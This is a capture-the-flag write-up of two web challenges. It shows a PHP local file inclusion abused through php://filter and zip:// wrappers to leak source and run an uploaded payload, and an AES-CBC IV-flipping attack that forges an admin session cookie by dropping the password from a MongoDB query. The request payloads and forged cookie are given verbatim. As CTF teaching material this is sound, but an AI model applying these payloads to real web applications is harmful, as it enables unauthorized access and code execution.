Participated as Ad Victoriam.

## web200

I've found a LFI vulnerability in a GET parameter by testing the parameter in the `index.php`.
It sounded more like that the code executes in the form of `include(null_filter($var).".php");`.

Later on, I've tried `php://filter` on the param and I was able to leak out the sourcecode of the `upload.php`.
`(index.php?mode=php://filter/convert.base64-encode/resource=upload)`

As we look further of how `upload.php` work,
we find out that the file checks for the extension but does not check the contents of the file.

Based on this information, we can think about zipping the file and load the php script from the zip file.

The possible payload from this can be `index.php?mode=zip:///var/www/owlur/owlur-upload-zzzzzz/*returned_filename_from_upload_php*.jpg%23*your_real_payload*`

Through this method you will be able to list the directory and read files, and eventually let you to read the file named `OWLUR-FLAG.txt` on the `/` directory.

```
GET: index.php?zip:///var/www/owlur/owlur-upload-zzzzzz/tqpmLQ2.jpg%23stypr

Response:
owlur
pwning complete by stypr
FLAG->PHP fILTerZ aR3 c00l buT i pr3f3r f1lt3r 0xc0ffee
```

--

## web400

The database seemed to be truncated every 15 minutes or so, and you can find out that the 'admin' username is taken whenever the database gets truncated.

The best possible case is to try a sql injection based on the functionality of mongodb and python.
As we move on, by reading the `index.py` script given from the ctf, we find out thaat the script encrypts the `auth` param in the cookie with AES-CBC encryption which is vulnerable to padding attacks.

Moreover, if we think about the code `user = g.db.users.find_one(get_cookie())` and the outline of how mongodb works,
we can actually remove the password parameter and let the cookie have the username only in it.

```
python: {"u":"username", "pw":"stypr"}
mongodb: SELECT * FROM (unknown) WHERE u='username' and pw='stypr'

python: {"u":"username"}
mongodb: SELECT * FROM (unknown) WHERE u='username'
```

Based on the things we kept in our mind, we just need to make the auth cookie to have `{"u":"admin"}\x03\x03\x03` as the plaintext.


```
- cbc padding vulnerability
    $ python
    ... (stripped - it does "plaintext xor iv xor fake_text" to create a fake iv) ...
    >>> print(base64.b64encode(malformed_iv+original_data))
        2zSNdk462MFkrqqwXK1Uut9d81nyZ7RGbV2q7PDX4uo=

- setting up the cookie (I just had put this on a javascript console)
    document.cookie="auth=2zSNdk462MFkrqqwXK1Uut9d81nyZ7RGbV2q7PDX4uo;"

- the response I've got
    <h2>Logged in as admin</h2> 
    ...
    <span class="badge badge-important">1</span><span class="btn btn-link" onclick="play('the_owls_are_watching_again')">THIS IS THE KEY</span></br></br>
```